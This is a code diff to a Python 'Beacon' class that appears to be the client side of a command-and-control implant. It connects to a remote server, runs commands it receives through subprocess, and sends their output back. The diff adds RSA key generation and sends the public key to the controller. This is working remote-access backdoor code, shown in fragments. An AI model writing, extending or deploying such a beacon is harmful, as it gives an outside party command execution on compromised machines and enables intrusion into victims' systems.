@@ -1,20 +1,24 @@
 #!/usr/bin/python3
 
-import socket,subprocess,time,string
+import socket,subprocess,time,string,rsa
 
 class Beacon:
    #Contains client side behavior and state
 
-   __slots__ = ["sock","running","server_ip","server_port","debugging"]
+   __slots__ = ["sock","running","server_ip","server_port","debugging","pubkey","privatekey"]
 
    def __init__(self,server_ip,server_port):
       self.running = False
       self.server_ip = server_ip
       self.server_port = server_port
       self.debugging = True
+      self.pubkey,self.privatekey = rsa.newkeys(2048)
+      print(self.pubkey,self.privatekey)
 
    def connect(self):
       self.sock.connect((self.server_ip,self.server_port))
+      pubkey_pem = self.pubkey.save_pkcs1(format='PEM')
+      self.sock.sendall(pubkey_pem)
 
    def run_command(self,command):
       try:
@@ -23,7 +27,7 @@ class Beacon:
          if self.debugging == True:
             print("Sending:" ,ps.stdout)
          if ps.stdout != None and ps.stdout != b'':
-            self.sock.send(ps.stdout.encode())
+            self.sock.send(ps.stdout)
          else:
             self.sock.send("SUCCESS".encode())
       except Exception as e:
